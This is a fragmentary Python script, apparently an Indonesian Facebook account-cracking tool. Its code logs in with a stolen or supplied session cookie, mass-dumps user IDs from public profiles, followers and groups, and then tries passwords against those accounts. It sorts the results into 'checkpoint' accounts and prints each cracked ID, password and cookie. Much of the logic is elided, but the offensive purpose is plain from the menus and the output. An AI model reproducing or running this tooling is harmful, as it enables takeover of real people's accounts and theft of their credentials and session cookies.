...
def login_lagi334():
	try:
		...
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
...
def menu(my_name,my_id):
	...
	print(f'╰─> Your Ip  : {ip}')
	print('')
	print(f'[•]{b} Pilih Crack Yang Anda Mau :{x} ')
	print(f' ╰─>{b} [1] Crack Publik{x}   {h}[On]{x} ')
	print(f' ╰─>{b} [2] Crack Follower{x} {h}[on]{x} ')
	print(f' ╰─>{b} [3] Crack Grup{x}     {h}[on]{x} ')
	print(f' ╰─>{b} [4] Crack File{x}     {h}[on]{x} ')
	print(f' ╰─>{b} [5] Hasil Crack{x}    {h}[On]{x} ')
	print(f' ╰─>{b} [0] {m}Keluar{x}       ')
...
def dump_massal():
	...
	try:
		print('')
		print(f'[★]{h} Total Idz Yang Terkumpul{x}💥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}[•]{b}Pilih Akun Yang Anda Mau :{x} ')
	print(f' ╰─>{b} [1] Akun Old{x} ')
	print(f' ╰─>{b} [2] Akun New{x} ')
	print(f' ╰─>{b} [3] Random{x}')
	hu = input('[•] Pilih : ')
	if hu in ['1','01']:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					print(f'\r{x}{b}╰─>{x} {h}{idf}•{pw}•{kuki}{N}')
